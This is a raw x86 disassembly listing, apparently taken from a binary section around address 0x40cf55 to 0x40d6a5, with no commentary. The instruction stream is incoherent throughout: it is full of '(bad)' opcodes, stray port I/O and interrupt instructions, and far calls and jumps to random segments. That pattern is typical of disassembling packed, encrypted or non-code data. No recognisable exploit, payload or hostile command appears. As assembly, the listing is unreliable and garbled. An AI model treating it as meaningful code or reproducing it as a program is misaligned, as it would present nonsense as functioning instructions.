  40cf55:	bound  ecx,QWORD PTR [esi+eax*4+0x31761e87]
  40cf5c:	(bad)  
  40cf5d:	push   edi
  40cf5e:	icebp  
  40cf5f:	rcr    BYTE PTR [edi-0x27ad47ec],0x30
  40cf66:	dec    ebx
  40cf67:	pop    ebp
  40cf68:	pop    edi
  40cf69:	fdivrp st(5),st
  40cf6b:	add    eax,DWORD PTR [ebx]
  40cf6d:	out    dx,al
  40cf6e:	adc    cl,BYTE PTR [eax+0x1a055f77]
  40cf74:	sub    ah,BYTE PTR [edi+0x10ee695]
  40cf7a:	test   al,0x20
  40cf7c:	add    eax,0x9f1b91e0
  40cf81:	push   ebp
  40cf82:	cs ret 
  40cf84:	and    al,0x68
  40cf86:	mov    ss,WORD PTR [esi]
  40cf88:	pop    esi
  40cf89:	je     0x40cf65
  40cf8b:	ins    DWORD PTR es:[edi],dx
  40cf8c:	shr    BYTE PTR [esi-0x3b],cl
  40cf8f:	dec    edx
  40cf90:	or     DWORD PTR [ebx],edi
  40cf92:	adc    DWORD PTR [edx],esp
  40cf94:	ss pop ds
  40cf96:	cld    
  40cf97:	sbb    eax,0x675ef
  40cf9c:	inc    ebp
  40cf9d:	xchg   edi,eax
  40cf9e:	js     0x40cf3c
  40cfa0:	icebp  
  40cfa1:	lock test ch,cl
  40cfa4:	jne    0x40cfb0
  40cfa6:	mov    bh,0x2d
  40cfa8:	jp     0x40cfbe
  40cfaa:	cmp    BYTE PTR [eax-0x44],0x87
  40cfae:	jp     0x40cf5c
  40cfb0:	test   BYTE PTR [ebp-0x4ec5dee8],cl
  40cfb6:	xchg   BYTE PTR [edi],dl
  40cfb8:	push   ss
  40cfb9:	neg    DWORD PTR [edi+0x52]
  40cfbc:	xchg   esi,eax
  40cfbd:	stos   DWORD PTR es:[edi],eax
  40cfbe:	mov    al,0x16
  40cfc0:	xchg   ebx,eax
  40cfc1:	in     al,dx
  40cfc2:	xor    DWORD PTR [ecx-0x30],0xffffffb2
  40cfc6:	push   eax
  40cfc7:	push   edi
  40cfc8:	sbb    BYTE PTR [eax-0xad99af3],0xb1
  40cfcf:	and    BYTE PTR ds:0x213e2571,cl
  40cfd5:	dec    esi
  40cfd6:	aad    0xab
  40cfd8:	sub    esp,esi
  40cfda:	sub    al,0xec
  40cfdc:	aam    0xab
  40cfde:	inc    edi
  40cfdf:	(bad)  
  40cfe0:	(bad)  
  40cfe1:	je     0x40d04b
  40cfe3:	in     eax,0x81
  40cfe5:	not    edi
  40cfe7:	js     0x40cf69
  40cfe9:	outs   dx,BYTE PTR ds:[esi]
  40cfea:	pop    ss
  40cfeb:	xchg   ebx,eax
  40cfec:	out    dx,al
  40cfed:	pop    es
  40cfee:	mov    ah,0x9f
  40cff0:	jne    0x40cfd0
  40cff2:	xchg   ebp,eax
  40cff3:	outs   dx,BYTE PTR ds:[esi]
  40cff4:	scas   eax,DWORD PTR es:[edi]
  40cff5:	inc    edx
  40cff6:	push   edi
  40cff7:	mov    dh,0x3a
  40cff9:	(bad)  
  40cffa:	cs sub al,ch
  40cffd:	call   0x3715:0xb7a776b4
  40d004:	pop    ds
  40d005:	lods   eax,DWORD PTR ds:[esi]
  40d006:	fcomp  DWORD PTR [ecx]
  40d008:	(bad)  
  40d009:	stos   DWORD PTR es:[edi],eax
  40d00a:	or     eax,esi
  40d00c:	mov    edi,0xa0ff1e69
  40d011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d012:	repz icebp 
  40d014:	cli    
  40d015:	mov    ecx,0xe91b2361
  40d01a:	mov    al,0x56
  40d01c:	pusha  
  40d01d:	adc    eax,0xcfe80661
  40d022:	fdiv   st(5),st
  40d024:	gs xchg edi,eax
  40d026:	pop    ecx
  40d027:	pop    edx
  40d028:	cmp    eax,0xd4fc92a6
  40d02d:	lfs    eax,FWORD PTR ds:0xffbff232
  40d034:	jg     0x40cfd1
  40d036:	sbb    DWORD PTR ds:0xdb8d7400,ecx
  40d03c:	cli    
  40d03d:	shl    edx,1
  40d03f:	(bad)  
  40d040:	fld    DWORD PTR [ebx]
  40d042:	imul   eax,DWORD PTR cs:[ebx-0x2e4a2e8],0xb0b887d8
  40d04d:	das    
  40d04e:	test   DWORD PTR [ecx+0x20],edi
  40d051:	jae    0x40d073
  40d053:	out    0x74,al
  40d055:	popa   
  40d056:	mov    ebp,0x1251d680
  40d05b:	ficomp DWORD PTR [eax+edx*1-0x2317120d]
  40d062:	scas   al,BYTE PTR es:[edi]
  40d063:	sub    DWORD PTR [ecx+0x644c5ae],0x16
  40d06a:	gs jge 0x40d026
  40d06d:	jnp    0x40d09e
  40d06f:	mov    esi,0xe4f768a3
  40d074:	xlat   BYTE PTR ds:[ebx]
  40d075:	xor    BYTE PTR [eax],cl
  40d077:	daa    
  40d078:	xchg   BYTE PTR [ebp+0x6602a0f],ch
  40d07e:	or     bl,BYTE PTR [bx+si]
  40d081:	xor    eax,0xdab3ff8c
  40d086:	shr    DWORD PTR [ebx+0x0],cl
  40d089:	inc    ecx
  40d08a:	dec    ecx
  40d08b:	bound  eax,QWORD PTR [ebp-0x61]
  40d08e:	mov    esi,0x6107c79c
  40d093:	scas   al,BYTE PTR es:[edi]
  40d094:	xor    eax,0x2292b129
  40d099:	test   DWORD PTR [ebp-0x53],0x8ae7009f
  40d0a0:	out    0x0,al
  40d0a2:	xchg   ecx,eax
  40d0a3:	mov    esi,0xebf2ceb1
  40d0a8:	xor    al,0x33
  40d0aa:	cwde   
  40d0ab:	inc    ebx
  40d0ac:	pushf  
  40d0ad:	jmp    0x40d0f9
  40d0af:	push   ecx
  40d0b0:	int    0x33
  40d0b2:	inc    ax
  40d0b4:	out    dx,eax
  40d0b5:	pop    es
  40d0b6:	and    edx,edx
  40d0b8:	nop
  40d0b9:	adc    al,0x40
  40d0bb:	cld    
  40d0bc:	sbb    ebx,DWORD PTR [esi+0x4]
  40d0bf:	int3   
  40d0c0:	sbb    esp,ebx
  40d0c2:	add    ah,BYTE PTR [ecx+0x79]
  40d0c5:	call   0xe632:0xe1811cd3
  40d0cc:	cmp    esp,ecx
  40d0ce:	push   0x6063942e
  40d0d3:	fisubr DWORD PTR [ecx]
  40d0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0d6:	mov    ebx,0xbb3ba890
  40d0db:	sbb    esi,0xb663c0c
  40d0e1:	mov    edi,0x33b85ee9
  40d0e6:	mov    bh,0x4e
  40d0e8:	outs   dx,DWORD PTR ds:[esi]
  40d0e9:	fadd   st(4),st
  40d0eb:	out    dx,al
  40d0ec:	ins    DWORD PTR es:[edi],dx
  40d0ed:	sub    BYTE PTR [eax+0x67],dl
  40d0f0:	push   ds
  40d0f1:	add    bh,0xdd
  40d0f4:	sub    BYTE PTR [edx+0x71],al
  40d0f7:	and    eax,ebp
  40d0f9:	scas   eax,DWORD PTR es:[edi]
  40d0fa:	out    dx,eax
  40d0fb:	gs cwde 
  40d0fd:	shl    BYTE PTR [ecx-0x57c75ba9],cl
  40d103:	fxtract 
  40d105:	ins    BYTE PTR es:[edi],dx
  40d106:	icebp  
  40d107:	cmp    BYTE PTR [edi-0x70006c17],dl
  40d10d:	xor    DWORD PTR [ecx-0x35],ebp
  40d110:	jecxz  0x40d13e
  40d112:	sub    bl,ch
  40d114:	dec    esi
  40d115:	pop    ds
  40d116:	xchg   ah,bh
  40d118:	pop    esi
  40d119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d11a:	push   ss
  40d11b:	mov    edi,0xd38074d5
  40d120:	ss push ecx
  40d122:	ret    0xbfb2
  40d125:	mov    al,ds:0x363d5fcf
  40d12a:	das    
  40d12b:	int3   
  40d12c:	dec    edx
  40d12d:	dec    ebp
  40d12e:	stos   DWORD PTR es:[edi],eax
  40d12f:	or     ch,BYTE PTR [esi+0x747d878b]
  40d135:	add    esi,DWORD PTR [eax+0x19]
  40d138:	sub    eax,0x8e8fc18d
  40d13d:	pop    ebx
  40d13e:	pop    edx
  40d13f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d140:	jecxz  0x40d1a3
  40d142:	not    DWORD PTR [eax]
  40d144:	shl    eax,cl
  40d146:	or     BYTE PTR [ebp-0x6a],bl
  40d149:	and    ebp,esp
  40d14b:	repnz (bad) 
  40d14d:	adc    DWORD PTR [eax+0xe],edx
  40d150:	xchg   BYTE PTR [ebx-0x6d],dl
  40d153:	pop    ebx
  40d154:	pop    ds
  40d155:	ins    BYTE PTR es:[edi],dx
  40d156:	test   ah,ah
  40d158:	or     eax,0x1427b1b8
  40d15d:	and    al,0xc1
  40d15f:	lock mov ah,0x28
  40d162:	pushf  
  40d163:	scas   al,BYTE PTR es:[edi]
  40d164:	arpl   sp,cx
  40d166:	dec    ebx
  40d167:	pushf  
  40d168:	and    edi,DWORD PTR [eax+0x60]
  40d16b:	and    eax,0x61ad554a
  40d170:	add    ebx,esi
  40d172:	inc    eax
  40d173:	cmp    DWORD PTR [esi+ecx*2],eax
  40d176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d177:	in     al,0x5c
  40d179:	in     eax,0xa3
  40d17b:	leave  
  40d17c:	adc    al,0x3c
  40d17e:	xchg   esi,eax
  40d17f:	jmp    0xde95:0xe6b54cfc
  40d186:	sub    bh,al
  40d188:	xor    BYTE PTR [eax+0x7a],bh
  40d18b:	and    eax,0xa056816d
  40d190:	xchg   ebx,eax
  40d191:	mov    ch,0xf7
  40d193:	fdivrp st(6),st
  40d195:	in     al,dx
  40d196:	xchg   edx,eax
  40d197:	es loop 0x40d1f1
  40d19a:	mov    esi,0xe49166d
  40d19f:	je     0x40d1a4
  40d1a1:	adc    dh,BYTE PTR [esi-0x19]
  40d1a4:	outs   dx,BYTE PTR ds:[esi]
  40d1a5:	in     eax,dx
  40d1a6:	mov    esi,0x9cd9a558
  40d1ab:	xor    bl,cl
  40d1ad:	pcmpeqb mm1,mm7
  40d1b0:	ret    
  40d1b1:	mov    esi,0xdfabd56
  40d1b6:	and    BYTE PTR [ecx+0x17],ch
  40d1b9:	(bad)
  40d1bc:	mov    esi,0x6354d87d
  40d1c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1c2:	call   0x96e38e4b
  40d1c7:	xchg   ebx,eax
  40d1c8:	mov    bh,0x6b
  40d1ca:	dec    esp
  40d1cb:	fiadd  DWORD PTR [edx-0x4f9d93fc]
  40d1d1:	int    0x9
  40d1d3:	xor    BYTE PTR [edi+0x74306805],dl
  40d1d9:	sbb    eax,0x85f1b6ac
  40d1de:	daa    
  40d1df:	jge    0x40d245
  40d1e1:	fild   DWORD PTR [edx]
  40d1e3:	xchg   al,al
  40d1e5:	lods   eax,DWORD PTR ds:[esi]
  40d1e6:	repz jns 0x40d230
  40d1e9:	push   0x43be3cf0
  40d1ee:	cmc    
  40d1ef:	ds ins BYTE PTR es:[edi],dx
  40d1f1:	iret   
  40d1f2:	add    al,0x48
  40d1f4:	bound  edi,QWORD PTR [ecx-0xf4c6758]
  40d1fa:	pop    es
  40d1fb:	bound  ecx,QWORD PTR [ecx-0x241ce286]
  40d201:	sbb    BYTE PTR [ebp+0xe],0x68
  40d205:	fcmovu st,st(5)
  40d207:	mov    cl,0x78
  40d209:	inc    edi
  40d20a:	jmp    0x11b82c9e
  40d20f:	jge    0x40d1ff
  40d211:	adc    ah,BYTE PTR [esi+ebp*1-0x58c83b8]
  40d218:	in     eax,0x16
  40d21a:	add    al,0x9a
  40d21c:	imul   eax,eax,0x7f
  40d21f:	sahf   
  40d220:	cmp    DWORD PTR [eax+0x11],ecx
  40d223:	mov    edx,0xaca4c9af
  40d228:	push   0x64070be0
  40d22d:	mov    bh,dh
  40d22f:	xchg   ebp,eax
  40d230:	out    0xe4,eax
  40d232:	push   0x25
  40d234:	push   esi
  40d235:	mov    ebp,0x1fcb7c41
  40d23a:	int3   
  40d23b:	out    0x34,eax
  40d23d:	inc    ebp
  40d23e:	fdiv   st,st(0)
  40d240:	and    edx,DWORD PTR [eax]
  40d242:	adc    bh,dh
  40d244:	fwait
  40d245:	cmp    BYTE PTR [ecx-0x783f0110],ah
  40d24b:	out    0x23,al
  40d24d:	aad    0xec
  40d24f:	inc    ecx
  40d250:	retf   
  40d251:	lods   al,BYTE PTR ds:[esi]
  40d252:	js     0x40d21c
  40d254:	jp     0x40d1e0
  40d256:	mov    dl,0xea
  40d258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d259:	jl     0x40d200
  40d25b:	add    ebp,0x3c
  40d25e:	jg     0x40d24a
  40d260:	(bad)  
  40d261:	aas    
  40d262:	xchg   edx,eax
  40d263:	and    DWORD PTR [ebp+0x52e9ffbb],ebp
  40d269:	adc    eax,0x2a
  40d26c:	push   edi
  40d26d:	enter  0x1c04,0xee
  40d271:	outs   dx,DWORD PTR ds:[esi]
  40d272:	sub    ah,cl
  40d274:	jns    0x40d2f4
  40d276:	fcmovnu st,st(7)
  40d278:	adc    DWORD PTR [esi-0x4d],esi
  40d27b:	daa    
  40d27c:	mov    WORD PTR [edx],ss
  40d27e:	sbb    ebx,DWORD PTR [ecx+0x7d6a219f]
  40d284:	call   DWORD PTR [ebp+0x67]
  40d287:	mov    ch,0x4e
  40d289:	push   ds
  40d28a:	aad    0xa2
  40d28c:	ror    BYTE PTR [ecx-0x6b01f4fd],cl
  40d292:	inc    ecx
  40d293:	ret    0x7109
  40d296:	outs   dx,DWORD PTR ds:[esi]
  40d297:	pop    ds
  40d298:	outs   dx,DWORD PTR ds:[esi]
  40d299:	jp     0x40d307
  40d29b:	fcom   QWORD PTR [esi+0x400bdd92]
  40d2a1:	cmp    BYTE PTR [ebx+0x5cec5c33],0x65
  40d2a8:	test   DWORD PTR [ebx+0x892c3d6],ecx
  40d2ae:	aas    
  40d2af:	fld    TBYTE PTR [ebp+0x15]
  40d2b2:	aas    
  40d2b3:	cmp    al,0x46
  40d2b5:	imul   esp,DWORD PTR [esi],0x35
  40d2b8:	ss jp  0x40d2f6
  40d2bb:	mov    dl,0xfb
  40d2bd:	pop    ebp
  40d2be:	xor    DWORD PTR [edx+esi*1-0x7df5aa7c],esp
  40d2c5:	clc    
  40d2c6:	les    ebx,FWORD PTR [ebx]
  40d2c8:	xlat   BYTE PTR ds:[ebx]
  40d2c9:	rcr    BYTE PTR [ebp+0x1b],1
  40d2cc:	push   ebp
  40d2cd:	sahf   
  40d2ce:	jecxz  0x40d25b
  40d2d0:	mov    cl,dl
  40d2d2:	adc    BYTE PTR [eax],0xcb
  40d2d5:	int    0xaf
  40d2d7:	sub    al,bh
  40d2d9:	adc    BYTE PTR [ebx+0x40],al
  40d2dc:	int3   
  40d2dd:	shr    eax,0x48
  40d2e0:	in     al,0x96
  40d2e2:	mov    bl,0x2e
  40d2e4:	ins    DWORD PTR es:[edi],dx
  40d2e5:	mov    eax,ds:0xfdf614e3
  40d2ea:	hlt    
  40d2eb:	rol    DWORD PTR [ebp-0x34a378e5],1
  40d2f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f2:	mov    ds:0x7bf48d66,eax
  40d2f7:	cmp    dh,bl
  40d2f9:	xlat   BYTE PTR ds:[ebx]
  40d2fa:	movsx  ebx,BYTE PTR [edi+0x6c]
  40d2fe:	inc    eax
  40d2ff:	sbb    edx,DWORD PTR [edi+eax*1]
  40d302:	mov    cs,ecx
  40d304:	lahf   
  40d305:	jne    0x40d295
  40d307:	sbb    ecx,DWORD PTR [edi+0x30]
  40d30a:	inc    ebp
  40d30b:	dec    ebp
  40d30c:	mov    ebp,0x93632913
  40d311:	lock ja 0x40d378
  40d314:	je     0x40d2bd
  40d316:	aam    0x2b
  40d318:	loope  0x40d328
  40d31a:	dec    esi
  40d31b:	in     al,0xfc
  40d31d:	push   ebx
  40d31e:	add    ebp,edi
  40d320:	sbb    ebp,esp
  40d322:	sub    BYTE PTR [ebx+esi*1],bh
  40d325:	add    esi,DWORD PTR [ecx-0x74340bcd]
  40d32b:	mov    fs,WORD PTR [edi-0x43]
  40d32e:	dec    esi
  40d32f:	mov    ebp,0x39678870
  40d334:	push   ebp
  40d335:	out    0xc8,al
  40d337:	ficom  WORD PTR [eax+0x41]
  40d33a:	adc    DWORD PTR [edi+0x2b34e8e6],0x42f6d350
  40d344:	mov    ds:0x1c997684,al
  40d349:	inc    edi
  40d34a:	pop    edi
  40d34b:	xchg   BYTE PTR [ecx],bh
  40d34d:	push   edi
  40d34e:	cmp    DWORD PTR [esi-0x2d],esi
  40d351:	sub    al,0x26
  40d353:	sub    esi,DWORD PTR [ecx]
  40d355:	sub    al,0xa3
  40d357:	or     ebp,esp
  40d359:	out    0x53,al
  40d35b:	cmp    bl,BYTE PTR [esi]
  40d35d:	mov    ch,0x9d
  40d35f:	leave  
  40d360:	mov    esi,0x944f5087
  40d365:	ret    
  40d366:	cs adc ebx,eax
  40d369:	pop    edx
  40d36a:	sahf   
  40d36b:	sub    ebp,edx
  40d36d:	xor    BYTE PTR [edi],dh
  40d36f:	(bad)  
  40d371:	es cmp eax,0xc27c784b
  40d377:	popf   
  40d378:	xchg   ebx,eax
  40d379:	push   es
  40d37a:	mov    ds:0x1ce14187,al
  40d37f:	sti    
  40d380:	jmp    DWORD PTR [eax-0x249da25e]
  40d386:	pop    ecx
  40d387:	lods   al,BYTE PTR ds:[esi]
  40d388:	push   edx
  40d389:	lods   eax,DWORD PTR ds:[esi]
  40d38a:	mov    al,0xe
  40d38c:	or     BYTE PTR [ebx+0x21],bl
  40d38f:	jno    0x40d396
  40d391:	jae    0x40d33d
  40d393:	xchg   DWORD PTR ds:[ebp-0x49],ebx
  40d397:	cmc    
  40d398:	mov    dh,0xbd
  40d39a:	xor    DWORD PTR [ecx+0x7ccf49d0],ebp
  40d3a0:	lods   al,BYTE PTR ds:[esi]
  40d3a1:	arpl   WORD PTR [ecx-0x5],di
  40d3a4:	pop    ecx
  40d3a5:	inc    eax
  40d3a6:	push   ss
  40d3a7:	sub    esp,DWORD PTR [esi+0x1c]
  40d3aa:	sub    bh,bh
  40d3ac:	int    0x4b
  40d3ae:	jmp    0x5125:0x8130
  40d3b4:	jb     0x40d352
  40d3b6:	mov    esp,0x2534d21e
  40d3bb:	scas   al,BYTE PTR es:[edi]
  40d3bc:	cmp    al,0x6e
  40d3be:	jae    0x40d343
  40d3c0:	push   ebx
  40d3c1:	repnz fwait
  40d3c3:	and    eax,0x9b20af9
  40d3c8:	fcom   DWORD PTR [edi+0x567e5225]
  40d3ce:	xchg   edx,eax
  40d3cf:	js     0x40d3ba
  40d3d1:	int    0xd4
  40d3d3:	and    eax,0x4eea9d51
  40d3d8:	stc    
  40d3d9:	push   ebx
  40d3da:	jg     0x40d39e
  40d3dc:	sub    eax,0xa6fa7232
  40d3e1:	xchg   bh,al
  40d3e3:	push   esi
  40d3e4:	add    ch,cl
  40d3e6:	ffreep st(2)
  40d3e8:	adc    eax,0xbf382044
  40d3ed:	xchg   ebp,eax
  40d3ee:	mov    DWORD PTR [edx+0x6a526dba],edi
  40d3f4:	inc    eax
  40d3f5:	or     DWORD PTR [ebx+eax*4+0x5e4db23a],eax
  40d3fc:	adc    BYTE PTR ds:0xd1b939fe,dl
  40d402:	fwait
  40d403:	in     eax,dx
  40d404:	mov    esp,0x40343623
  40d409:	in     al,0x7b
  40d40b:	fild   WORD PTR [esi+0x2ca5cc]
  40d411:	mov    ds:0xc33d2bfd,al
  40d416:	add    al,dh
  40d418:	push   ebp
  40d419:	ds push edx
  40d41b:	push   es
  40d41c:	popf   
  40d41d:	jb     0x40d46d
  40d41f:	stos   DWORD PTR es:[edi],eax
  40d420:	fs push cs
  40d422:	add    BYTE PTR [ecx-0x40],ch
  40d425:	cwde   
  40d426:	mov    bh,bh
  40d428:	scas   eax,DWORD PTR es:[edi]
  40d429:	popf   
  40d42a:	outs   dx,DWORD PTR ds:[esi]
  40d42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d42c:	xor    esp,edx
  40d42e:	mov    esp,0xdbb92547
  40d433:	adc    dh,BYTE PTR [edx+0x7616de4f]
  40d439:	or     al,0x22
  40d43b:	retf   0x5e1e
  40d43e:	push   es
  40d43f:	xchg   BYTE PTR [edx-0x42dc9d5d],cl
  40d445:	sub    DWORD PTR [esi],esp
  40d447:	push   edi
  40d448:	xchg   ebp,eax
  40d449:	or     cl,BYTE PTR [eax+eax*4+0x2cc44935]
  40d450:	cld    
  40d451:	or     dl,BYTE PTR [esi]
  40d453:	jge    0x40d3f5
  40d455:	sub    ch,BYTE PTR [esi+eax*2-0x7b]
  40d459:	push   esp
  40d45a:	scas   al,BYTE PTR es:[edi]
  40d45b:	in     al,dx
  40d45c:	test   eax,0x6a0e6ccb
  40d461:	mov    al,0xb2
  40d463:	sub    WORD PTR [eax+0x7d],cx
  40d467:	(bad)  
  40d468:	mov    edi,0x4315634c
  40d46d:	sar    BYTE PTR [eax+esi*8+0x40],cl
  40d471:	arpl   WORD PTR [edx+0x3],si
  40d474:	(bad)
  40d478:	push   cs
  40d479:	iret   
  40d47a:	je     0x40d4a1
  40d47c:	dec    ecx
  40d47d:	jecxz  0x40d41e
  40d47f:	pop    ebp
  40d480:	pop    esp
  40d481:	xor    DWORD PTR [ebp+0x55],edx
  40d484:	or     ecx,DWORD PTR [ebp-0x43]
  40d487:	inc    ecx
  40d488:	mov    edx,ss
  40d48a:	cli    
  40d48b:	pop    es
  40d48c:	sti    
  40d48d:	mov    edx,0x1961b4e7
  40d492:	and    eax,0xa5e553ef
  40d497:	dec    ecx
  40d498:	add    esp,DWORD PTR [esi+eax*1+0x2c]
  40d49c:	add    BYTE PTR [edi-0x2d],bl
  40d49f:	rep lods ax,WORD PTR ds:[esi]
  40d4a2:	test   eax,0x87792628
  40d4a7:	pop    esp
  40d4a8:	and    dl,BYTE PTR [edx+0x516292e7]
  40d4ae:	xlat   BYTE PTR ds:[ebx]
  40d4af:	gs retf 0x1fc0
  40d4b3:	retf   
  40d4b4:	cmp    ch,BYTE PTR [edi+0x4c]
  40d4b7:	(bad)  
  40d4b8:	sub    ch,BYTE PTR [esi]
  40d4ba:	fsubp  st(3),st
  40d4bc:	and    eax,0x881bd118
  40d4c1:	adc    eax,ebx
  40d4c3:	aam    0x3a
  40d4c5:	push   cs
  40d4c6:	mov    edx,0x8769076b
  40d4cb:	shl    DWORD PTR ds:0xae379637,cl
  40d4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d2:	or     DWORD PTR [ebp+0x2174398f],ebx
  40d4d8:	int3   
  40d4d9:	and    cl,al
  40d4db:	inc    ebp
  40d4dc:	inc    eax
  40d4dd:	ret    0x1c84
  40d4e0:	cmp    DWORD PTR [ecx-0x11de65c9],0xe00d50fb
  40d4ea:	xchg   edi,eax
  40d4eb:	cmp    al,0xd3
  40d4ed:	(bad)  
  40d4ee:	sbb    al,0xc4
  40d4f0:	popa   
  40d4f1:	test   DWORD PTR [eax-0x4d],ebp
  40d4f4:	test   DWORD PTR [ebx],ebx
  40d4f6:	xor    edx,DWORD PTR [eax+esi*1+0x2e]
  40d4fa:	ss inc esi
  40d4fc:	lahf   
  40d4fd:	adc    eax,0x176492cd
  40d502:	popf   
  40d503:	fwait
  40d504:	sub    ch,BYTE PTR [esi-0xc37dfc4]
  40d50a:	mov    cl,0x55
  40d50c:	bound  eax,QWORD PTR [edx+esi*1+0x588a129]
  40d513:	aas    
  40d514:	sub    BYTE PTR [eax+0x1b2ad29],al
  40d51a:	sbb    cl,BYTE PTR [edx]
  40d51c:	leave  
  40d51d:	lods   al,BYTE PTR ds:[esi]
  40d51e:	cmp    eax,DWORD PTR [eax+0x4bb4e27b]
  40d524:	(bad)  
  40d525:	pop    esp
  40d526:	sbb    ch,BYTE PTR [ebp+0x1c]
  40d529:	adc    eax,0x8135def9
  40d52e:	jns    0x40d534
  40d530:	or     bl,BYTE PTR [ebx-0x7caf8b7d]
  40d536:	pop    ebp
  40d537:	dec    ecx
  40d538:	stos   DWORD PTR es:[edi],eax
  40d539:	or     dl,dh
  40d53b:	scas   al,BYTE PTR es:[edi]
  40d53c:	and    cl,bl
  40d53e:	leave  
  40d53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d540:	jb     0x40d4e2
  40d542:	sbb    eax,0x39c2d9d0
  40d547:	xor    eax,0x29a01228
  40d54c:	and    BYTE PTR [ecx+0x2a63fe3c],cl
  40d552:	bound  eax,QWORD PTR [ebp+0x59d86290]
  40d558:	out    0x4a,eax
  40d55a:	xor    ecx,DWORD PTR [ebx-0x30]
  40d55d:	or     esp,eax
  40d55f:	test   ebp,edx
  40d561:	das    
  40d562:	data16 fistp QWORD PTR [ecx]
  40d565:	cmp    bl,BYTE PTR [edx-0x18]
  40d568:	inc    eax
  40d569:	pop    es
  40d56a:	call   0xcd15:0x1adb6aa4
  40d571:	scas   eax,DWORD PTR es:[edi]
  40d572:	in     al,0x3c
  40d574:	test   DWORD PTR [esi+0x76],ebp
  40d577:	push   ds
  40d578:	mov    dh,0xde
  40d57a:	(bad)  
  40d57b:	sub    cl,BYTE PTR [ecx+0x30]
  40d57e:	sti    
  40d57f:	daa    
  40d580:	imul   esp,ecx,0x3f
  40d583:	jge    0x40d52d
  40d585:	aad    0x1a
  40d587:	test   al,0xd1
  40d589:	cmp    al,0xc2
  40d58b:	in     eax,0xa
  40d58d:	cmp    DWORD PTR [eax+0x4422acf0],0xffffff94
  40d594:	adc    eax,0xad43c4a0
  40d599:	add    DWORD PTR [eax-0x67],edi
  40d59c:	mov    ax,ds:0x5c86cf89
  40d5a2:	or     al,BYTE PTR [ecx+0x78]
  40d5a5:	dec    edi
  40d5a6:	(bad)  
  40d5a7:	int3   
  40d5a8:	loope  0x40d56d
  40d5aa:	adc    eax,0x399626b5
  40d5af:	cmp    eax,0x341455b5
  40d5b4:	xor    eax,0xdee40fbc
  40d5b9:	pop    ebp
  40d5ba:	adc    dl,dl
  40d5bc:	fldcw  WORD PTR [edx]
  40d5be:	pop    esp
  40d5bf:	pop    ss
  40d5c0:	jne    0x40d546
  40d5c2:	fidivr DWORD PTR [edx+edx*1+0x2c]
  40d5c6:	fs imul esi,esp,0x38
  40d5ca:	in     al,0x52
  40d5cc:	adc    DWORD PTR [esi-0x480bbb96],edi
  40d5d2:	outs   dx,DWORD PTR ds:[esi]
  40d5d3:	push   ss
  40d5d4:	cmp    dh,BYTE PTR [eax]
  40d5d6:	popa   
  40d5d7:	ror    BYTE PTR [ecx-0x116d7954],cl
  40d5dd:	adc    edi,DWORD PTR [eax]
  40d5df:	adc    BYTE PTR [edx-0x75e40533],0x5
  40d5e6:	and    al,0x48
  40d5e8:	pushf  
  40d5e9:	ja     0x40d56e
  40d5eb:	sahf   
  40d5ec:	lods   al,BYTE PTR ds:[esi]
  40d5ed:	inc    ecx
  40d5ee:	adc    BYTE PTR [edx],0x74
  40d5f1:	adc    DWORD PTR [ecx*4+0x472ca52f],0xffffffb6
  40d5f9:	(bad)  
  40d5fa:	xor    eax,0xc9af0e92
  40d5ff:	ror    BYTE PTR [ecx-0x47],cl
  40d602:	xchg   edi,eax
  40d603:	mov    edi,0x82d33c14
  40d608:	popf   
  40d609:	inc    edx
  40d60a:	push   esi
  40d60b:	loope  0x40d5b0
  40d60d:	mov    ds:0x26cd4831,al
  40d612:	(bad)  
  40d613:	push   ds
  40d614:	cmp    DWORD PTR [ecx+0x3f],0xfb7db7c4
  40d61b:	fwait
  40d61c:	shr    DWORD PTR [esi+0x74],cl
  40d61f:	iret   
  40d620:	and    bl,bl
  40d622:	ror    DWORD PTR [esi+eax*8-0x78],0x73
  40d627:	pop    ds
  40d628:	push   ecx
  40d629:	ja     0x40d600
  40d62b:	pop    ebp
  40d62c:	and    eax,DWORD PTR [ecx]
  40d62e:	in     al,0xbd
  40d630:	dec    ebp
  40d631:	call   0xfe443d9b
  40d636:	pop    ds
  40d637:	inc    esi
  40d638:	xchg   edi,eax
  40d639:	das    
  40d63a:	xchg   ecx,eax
  40d63b:	xchg   edx,eax
  40d63c:	leave  
  40d63d:	dec    ecx
  40d63e:	xchg   esi,eax
  40d63f:	sbb    eax,0xaaf80c6e
  40d644:	or     DWORD PTR [edx],0x449e8799
  40d64a:	ret    0x5a87
  40d64d:	mov    bl,0x7b
  40d64f:	test   al,0x64
  40d651:	dec    ebp
  40d652:	mov    ecx,0x3a19d12d
  40d657:	mov    al,0xbe
  40d659:	call   0x2950a52c
  40d65e:	nop
  40d65f:	sar    DWORD PTR [ebp+edi*4+0x3875c772],0xb
  40d667:	data16 outs dx,BYTE PTR ds:[esi]
  40d669:	daa    
  40d66a:	pop    ds
  40d66b:	dec    eax
  40d66c:	fimul  DWORD PTR [ebx+0x34]
  40d66f:	iret   
  40d670:	jle    0x40d6f1
  40d672:	aaa    
  40d673:	imul   esi,DWORD PTR [esi],0xffffffbe
  40d676:	mov    eax,ds:0x16f315e0
  40d67b:	dec    esp
  40d67c:	push   edx
  40d67d:	(bad)  
  40d67e:	and    al,0xf1
  40d680:	mov    ah,0x67
  40d682:	dec    esi
  40d683:	scas   eax,DWORD PTR es:[edi]
  40d684:	push   ecx
  40d685:	adc    BYTE PTR [ecx],cl
  40d687:	xchg   ecx,eax
  40d688:	rol    DWORD PTR [ebx+esi*2],1
  40d68b:	mov    al,0x99
  40d68d:	test   DWORD PTR [edi-0x15],ebp
  40d690:	stos   DWORD PTR es:[edi],eax
  40d691:	push   ecx
  40d692:	es pop esi
  40d694:	push   0x8
  40d696:	mov    eax,ds:0xd436cdb9
  40d69b:	lea    ecx,[ecx+0x46]
  40d69e:	lock add al,0x34
  40d6a1:	shl    ah,0xd6
  40d6a4:	inc    ecx
  40d6a5:	das    
